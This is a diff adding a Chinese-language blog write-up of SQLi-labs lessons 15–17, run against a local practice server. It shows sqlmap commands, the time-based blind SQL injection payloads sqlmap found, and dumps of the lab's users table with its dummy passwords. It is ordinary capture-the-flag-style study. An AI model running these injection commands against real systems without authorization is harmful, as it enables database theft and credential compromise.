@@ -451,7 +451,61 @@
 
 
 <hr>
-<h2 id="15："><a href="#15：" class="headerlink" title="#15："></a>#15：</h2><hr>
+<h2 id="15："><a href="#15：" class="headerlink" title="#15："></a>#15：</h2><p>15题的页面跟前面依旧一样，这边如果后面还是一眼的话，就不贴，浪费时间了。</p>
+<p>简单抓一下包，还是	uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit	。</p>
+<p>sqlmap直接看一下。</p>
+<p>显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: uname (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname=1&#x27; AND (SELECT 7394 FROM (SELECT(SLEEP(5)))qNFo) AND &#x27;pXSl&#x27;=&#x27;pXSl&amp;passwd=1&amp;submit=Submit</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>只存在时间盲注。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-15/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --technique=T \</span><br><span class="line">&gt; --time-sec=1 \</span><br><span class="line">&gt; --current-db</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap直接注入。</p>
+<p>得到	<code>current database: &#39;security&#39;</code></p>
+<p>ok，看来这一题也没有什么其他的情况。</p>
+<p>正常注入就行了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qlmap -u &quot;http://localhost/Less-15/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --technique=T \</span><br><span class="line">&gt; --time-sec=1 \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; -T users \</span><br><span class="line">&gt; --dump</span><br></pre></td></tr></table></figure>
+
+<p>说实话，目前感觉这种类型的已经没有学习的经验了，没有任何意外性，sqlmap指令直接下去就能出了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="16："><a href="#16：" class="headerlink" title="#16："></a>#16：</h2><p>一样界面，小抓。</p>
+<p>依然	uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit	。</p>
+<p>sqlmap直接扫。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-16/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>哇，这次居然没有结果，提高一下等级。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-16/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --level=3 \</span><br><span class="line">&gt; --risk=2 \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: uname (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname=1&quot;) AND (SELECT 8031 FROM (SELECT(SLEEP(5)))iluz) AND (&quot;LFeC&quot;=&quot;LFeC&amp;passwd=1&amp;submit=Submit</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>ok，显示在用户名这边村咋时间盲注。</p>
+<p>可恶，又要慢慢跑了。</p>
+<p>current database: ‘security’。</p>
+<p>拿下。</p>
+<p>再次：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-16/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --level=5 \</span><br><span class="line">&gt; --risk=3 \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-16/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --level=5 \</span><br><span class="line">&gt; --risk=3 \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; -T users \</span><br><span class="line">&gt; --dump</span><br></pre></td></tr></table></figure>
+
+<p>拿下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="17："><a href="#17：" class="headerlink" title="#17："></a>#17：</h2><p><img src="/images/QQ20260103-200742.png" alt="alt text"></p>
+<p>这次有点不一样了。</p>
+<p>抓个包看看。</p>
+<p>uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<p>emmmmm。</p>
+<p>sqlmap扫扫看。</p>
+<p>同样没结果，提高一下级别看看。</p>
+<p>哇，cool，居然最高等级也没有结果。</p>
+<hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -460,6 +514,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1767439731229"></script>
+<script src="/js/main.js?v=1767442695293"></script>
 </body>
 </html>
